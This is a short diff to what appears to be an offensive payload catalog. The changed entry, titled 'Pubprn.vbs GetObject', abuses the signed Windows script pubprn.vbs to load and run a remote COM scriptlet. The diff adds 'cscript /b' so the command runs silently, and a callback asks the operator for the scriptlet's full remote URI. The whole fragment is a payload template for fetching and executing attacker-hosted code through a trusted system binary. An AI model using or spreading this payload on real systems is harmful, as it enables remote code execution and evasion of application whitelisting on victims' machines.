@@ -241,7 +241,7 @@ Load({
 
 Load({
 	title: "Pubprn.vbs GetObject",
-	payload: 'C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost "script:<PROMPT (Full URI to scriplet)>"',
+	payload: 'cscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost "script:<PROMPT (Full URI to scriplet)>"',
 	category: "COM Scriplets",
 	callback: function(bro){
 	    question("Enter the full path to your remote COM scriplet: ")
